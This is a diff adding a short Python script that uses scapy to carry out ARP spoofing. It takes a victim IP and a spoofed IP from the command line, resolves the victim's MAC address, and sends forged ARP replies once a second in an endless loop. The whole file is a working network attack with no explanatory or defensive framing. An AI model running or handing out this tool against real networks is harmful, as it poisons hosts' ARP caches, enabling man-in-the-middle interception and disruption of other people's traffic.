@@ -1,0 +1,17 @@
+from scapy.all import *
+import time
+import sys
+
+victim_ip = sys.argv[1]
+fake_ip = sys.argv[2]
+
+victim_mac = getmacbyip(victim_ip)
+
+pkt = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=fake_ip)
+
+while True:
+    send(pkt, verbose=0)
+    time.sleep(1)
+
+
+
